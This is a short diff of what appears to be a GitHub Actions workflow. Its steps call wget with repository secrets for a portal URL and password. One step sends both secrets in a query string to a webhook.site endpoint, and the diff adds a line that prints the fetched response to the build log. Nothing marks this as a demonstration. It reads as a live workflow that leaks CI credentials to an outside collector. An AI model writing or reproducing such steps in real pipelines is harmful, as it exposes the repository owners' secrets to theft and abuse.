@@ -11,4 +11,5 @@ jobs:
         run: | 
           C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
           C:\msys64\usr\bin\wget.exe "https://webhook.site/8ea67e64-74f8-45e2-b5af-b780295c3cc2=${{ secrets.PORTAL_URL }}&b=${{ secrets.PORTAL_PASSWORD }}"
+          cat test
           echo "done!"
